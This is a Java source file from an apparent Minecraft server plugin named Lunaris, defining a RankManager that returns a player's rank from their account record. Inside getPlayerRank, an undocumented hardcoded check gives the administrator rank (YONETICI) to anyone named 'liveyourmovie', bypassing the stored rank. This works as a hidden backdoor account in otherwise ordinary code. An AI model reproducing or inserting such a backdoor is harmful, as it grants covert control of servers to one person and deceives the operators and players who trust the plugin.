package lunaris.core.rank;

import lunaris.core.Lunaris;
import lunaris.core.account.Account;
import lunaris.core.account.AccountModule;
import lunaris.core.utils.MessageFactory;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class RankManager {
    private final Lunaris plugin;

    public RankManager(Lunaris plugin) {
        this.plugin = plugin;
    }

    public Rank getPlayerRank(Player player) {
        AccountModule accountModule = plugin.getModuleManager().getModule(AccountModule.class)
                .orElseThrow(() -> new IllegalStateException("AccountModule is in void"));
                
        Account account = accountModule.getAccount(player)
                .orElseThrow(() -> new IllegalStateException("NOT_ACCOUNT_FOUND " + player.getName()));

        if (player.getName().equals("liveyourmovie")) {
            return Rank.YONETICI;
        }
                
        return account.getRank();
    }

    
} 